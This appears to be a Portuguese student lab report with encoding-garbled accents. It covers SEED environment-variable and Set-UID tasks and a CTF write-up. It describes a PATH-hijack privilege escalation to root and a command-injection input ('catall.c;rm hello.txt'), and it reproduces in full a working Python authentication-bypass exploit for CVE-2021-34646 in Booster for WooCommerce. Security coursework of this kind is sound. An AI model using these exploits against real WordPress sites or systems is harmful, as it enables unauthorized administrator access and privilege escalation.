# Trabalho realizado na Semana #4

## Tarefa 1
Ao correr comando *printenv*, obteve-se o seguinte output:
```
SHELL=/bin/bash
SESSION_MANAGER=local/VM:@/tmp/.ICE-unix/2054,unix/VM:/tmp/.ICE-unix/2054
QT_ACCESSIBILITY=1
COLORTERM=truecolor
XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg
XDG_MENU_PREFIX=gnome-
GNOME_DESKTOP_SESSION_ID=this-is-deprecated
GNOME_SHELL_SESSION_MODE=ubuntu
SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
XMODIFIERS=@im=ibus
DESKTOP_SESSION=ubuntu
SSH_AGENT_PID=2017
GTK_MODULES=gail:atk-bridge
PWD=/home/seed
LOGNAME=seed
XDG_SESSION_DESKTOP=ubuntu
XDG_SESSION_TYPE=x11
GPG_AGENT_INFO=/run/user/1000/gnupg/S.gpg-agent:0:1
XAUTHORITY=/run/user/1000/gdm/Xauthority
GJS_DEBUG_TOPICS=JS ERROR;JS LOG
WINDOWPATH=2
HOME=/home/seed
USERNAME=seed
IM_CONFIG_PHASE=1
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
XDG_CURRENT_DESKTOP=ubuntu:GNOME
VTE_VERSION=6003
GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/11530a2c_44e2_4d3f_82b6_f0f496db28e5
INVOCATION_ID=fa9a8773a3c84b0a94959a2257b8e043
MANAGERPID=1799
GJS_DEBUG_OUTPUT=stderr
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=seed
GNOME_TERMINAL_SERVICE=:1.103
DISPLAY=:0
SHLVL=1
QT_IM_MODULE=ibus
XDG_RUNTIME_DIR=/run/user/1000
JOURNAL_STREAM=9:35913
XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share/:/usr/share/:/var/lib/snapd/desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:.
GDMSESSION=ubuntu
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
_=/usr/bin/printenv
```

Um resultado semelhante foi mostrado com env.
Este comandos mostram as vari??veis de ambiente presentes no sistema. 

Por outro lado, usando os comandos
```sh
printenv X
```
ou 
```sh
env | grep X
```
?? apenas mostrada a vari??vel de ambiente X. No nosso caso, explor??mos a 
vari??vel *PWD*.

Com o uso de *export*, conseguiu-se colocar uma nova vari??vel de ambiente 
com o nome e valor ?? nossa escolha. Para a remover, bastou o uso de *unset*. 
Foi poss??vel verificar estas altera????es com os comandos anteriores.

## Tarefa 2 
Correndo o comando *diff*, n??o foram encontradas diferen??as entre as 
vari??veis de ambiente dos dois processos. Assim, pode concluir-se que 
as vari??veis de ambiente s??o herdadas pelo processo filho do processo pai. 

## Tarefa 3
1. Nada ?? mostrado na consola
2. Desta vez, as vari??veis de ambiente j?? s??o mostradas
3. Pelos pontos 1 e 2, pode concluir-se que com a utiliza????o de *execve*, 
o novo programa s?? ter?? as vari??veis de ambiente que lhe forem passadas 
expl??citamente no 3?? par??metro.

## Tarefa 4
De facto, comprova-se o que ?? dito no enunciado desta tarefa. As vari??veis 
de ambiente s??o herdadas e como tal s??o mostradas.

## Tarefa 5
As vari??veis *PATH* e *ANY_NAME* encontavam-se presentes no proccesso filho 
SET-UID. Contudo, a vari??vel *LD_LIBRARY_PATH* n??o, fazendo crer que 
nem todas as vari??veis de ambiente foram herdadas da shell.
Ap??s alguma investiga????o, concluiu-se ser um mencanismo de seguran??a do *dynamic linker*. Esta vari??vel de ambiente cont??m informa????o usada pelo *dynamic link loader* para saber onde procurar as bibliotecas din??micas partilhadas (o que pode ser uma pot??ncial arma pensado em *Return Oriented Programming*). Como o *user* dono do programa ?? diferente do que mudou esta vari??vel na *shell*, esta altera????o n??o se verifica.

## Tarefa 6
?? de facto perigoso o uso de programas *SET-UID*. Partindo do c??digo vulner??vel:
```c
int main() {  
   system("ls");  
   return 0;  
}
```
Observamos que ele pretende utilizar o utilit??rio `/bin/ls`. Contudo, dado
que foi dado o caminho absoluto ele vai utilizar o `PATH` para encontrar o programa.  
Desta forma, e dado que `PATH` ?? uma vari??vel de ambiente, fizemos exploit
desta vulnerabilidade criando um programa com nome `ls` e acrescentando o
diret??rio corrente ao in??cio do `PATH`: `export PATH=.:$PATH`. Desta forma, quando `system("ls")`
executou, ele n??o executou `/bin/ls` mas o programa que n??s criamos. Assim,
e uma vez que o programa vulner??vel ?? *SET-UID*, tornou-se poss??vel executar
o programa criado por n??s, enquanto users n??o *root*, e execut??-lo como root.
No nosso programa `ls` fizemos uma chamada de acesso ?? shell que nos permitiu
ter acesso ?? shell como *root*, sendo que a partir daqui ganh??mos controlo total
da m??quina.

## Tarefa 7
Apenas no segundo caso, n??o ?? chamada a fun????o *sleep* que costumizada. Como sugerido, criou-se uma experi??ncia para descobrir a origem do problema mostrando as vari??vel de ambiente *LD_PRELOAD* imediatamente antes de depois da chamada da fun????o *sleep*. Verificou-se assim que, apenas neste caso, a vari??vel n??o foi herdada. Tal tem uma explica????o semelhante ?? dada na Tarefa 5 para a vari??vel LD_LIBRARY_PATH.

## Tarefa 8
### Step 1
?? de facto poss??vel colocar o programa a, por exemplo, remover um ficheiro. Como se usa *system* e n??o se faz o processamento do *input* para verificar se estamos na presen??a de um ficheiro, pode-se fornecer ao programa um comando e este ser?? executado. Basta
```sh
catall catall.c;rm hello.txt
```
e o programa, para al??m de mostrar o conte??do de *catall.c* tamb??m ir?? remover *hello.txt*.
### Step 2
Neste caso, o ataque j?? falha. Tal deve-se ao facto de *execve* considerar todo o *input* como o nome do ficheiro evitando assim a execu????o do comando pretendido.

## Tarefa 9 
Ao correr este programa, o *fd* n??o ?? fechado no fim e como tal, as permiss??es continuam l??. Basta, portanto, escrever para o *fd* mostrado depois de o executar e o ficheiro protegido aparece alterado.

## CTF

Para realizar este CTF, come??amos por fazer a investiga????o inicial que nos
levou a encontrar as seguintes informa????es sobre o wordpress, plugins e respetivas
vers??es:
    
- Vers??o do Wordpress: **5.8.1**
- Vers??o do WooCommerce plugin: **5.7.1**
- Vers??o do Booster for WooCommerce plugin: **5.4.3**

Quanto aos utilizadores, encontramos duas refer??ncias:

- admin
- Orval Sanford

Estas informa????es foram obtidas navegando pelo site:  
![/imgs4/info.png](/imgs4/info.png)  
![/imgs4/users.png](/imgs4/users.png)

Partindo destas informa????es realizamos diversas pesquisas usando como *keywors*:
*"Wordpress"*, *"WooCommerce plugin"* e *"Booster for WooCommerce plugin"*.

Ap??s v??rias tentativas, com uma simples pesquisa no *google* por:
```
Booster for WooCommerce plugin 5.4.3 cve
```
Encontr??mos os seguintes resultados:  
![/imgs4/google.png](/imgs4/google.png)

Abrimos o [3.?? resultado](https://nvd.nist.gov/vuln/detail/CVE-2021-34646) e deparamo-nos com a seguinte descri????o:

>Versions up to, and including, **5.4.3**, of the **Booster for WooCommerce WordPress 
>plugin** are **vulnerable to authentication bypass** via the process_email_verification 
>function due to a random token generation weakness in the 
>reset_and_mail_activation_link function found in the 
>~/includes/class-wcj-emails-verification.php file. This allows attackers to 
>impersonate users and trigger an email address verification for arbitrary accounts, 
>including administrative accounts, and automatically be logged in as that user, 
>including any site administrators. This requires the Email Verification module 
>to be active in the plugin and the Login User After Successful Verification 
>setting to be enabled, which it is by default.

Esta pareceu imediantamente ser a descri????o da vulnerabilidade ideal para o CTF 
em quest??o e corresponde ao `CVE-2021-34646`.

De forma a confirmar as nossas suspeitas submetemos a flag "`flag{CVE-2021-34646}`" no 
desafio "Semana 4 - Desafio 1" e acert??mos.

Agora faltava encontrar o exploit. Esta pesquisa foi simples, e bastou apenas 
pesquisar pelo CVE na plataforma [exploit-db.com](exploit-db.com) para 
encontrar um [exploit](https://www.exploit-db.com/exploits/50299):

```py
# Exploit Title: WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
# Date: 2021-09-16
# Exploit Author: Sebastian Kriesten (0xB455)
# Contact: https://twitter.com/0xB455
#
# Affected Plugin: Booster for WooCommerce
# Plugin Slug: woocommerce-jetpack
# Vulnerability disclosure: https://www.wordfence.com/blog/2021/08/critical=-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/
# Affected Versions: <= 5.4.3
# Fully Patched Version: >= 5.4.4
# CVE: CVE-2021-34646
# CVSS Score: 9.8 (Critical)
# Category: webapps
#
# 1:
# Goto: https://target.com/wp-json/wp/v2/users/
# Pick a user-ID (e.g. 1 - usualy is the admin)
#
# 2:
# Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
#
# 3:
# Check-Out  out which of the generated links allows you to access the system
#
import requests,sys,hashlib
import argparse
import datetime
import email.utils
import calendar
import base64

B = "\033[94m"
W = "\033[97m"
R = "\033[91m"
RST = "\033[0;0m"

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the base url")
parser.add_argument('id', type=int, help='the user id', default=1)
args = parser.parse_args()
id = str(args.id)
url = args.url
if args.url[-1] != "/": # URL needs trailing /
        url = url + "/"

verify_url= url + "?wcj_user_id=" + id
r = requests.get(verify_url)

if r.status_code != 200:
        print("status code != 200")
        print(r.headers)
        sys.exit(-1)

def email_time_to_timestamp(s):
    tt = email.utils.parsedate_tz(s)
    if tt is None: return None
    return calendar.timegm(tt) - tt[9]

date = r.headers["Date"]
unix = email_time_to_timestamp(date)

def printBanner():
    print(f"{W}Timestamp: {B}" + date)
    print(f"{W}Timestamp (unix): {B}" + str(unix) + f"{W}\n")
    print("We need to generate multiple timestamps in order to avoid delay related timing errors")
    print("One of the following links will log you in...\n")

printBanner()



for i in range(3): # We need to try multiple timestamps as we don't get the exact hash time and need to avoid delay related timing errors
        hash = hashlib.md5(str(unix-i).encode()).hexdigest()
        print(f"{W}#" + str(i) + f" link for hash {R}"+hash+f"{W}:")
        token='{"id":"'+ id +'","code":"'+hash+'"}'
        token = base64.b64encode(token.encode()).decode()
        token = token.rstrip("=") # remove trailing =
        link = url+"my-account/?wcj_verify_email="+token
        print(link + f"\n{RST}")       
```

Guardando o script com o nome de `exploit.py` bastou execut??-lo com a seguinte invoca????o:
```
python exploit.py http://ctf-fsi.fe.up.pt:5001/ 1
```

Para obter os poss??veis links de *authentication bypass* como admin:
![/imgs4/cmd.png](/imgs4/cmd.png)

Utilizando o primeiro, conseguimos aceder a `http://ctf-fsi.fe.up.pt:5001/` como admin.
De forma a completar o CTF, acedemos a um post privado:
![/imgs4/flag.png](/imgs4/flag.png)

Onde foi poss??vel encontrar a flag final e terminar o desafio:
```
flag{c6102bc64f6abaef67b626b56d917114}
```
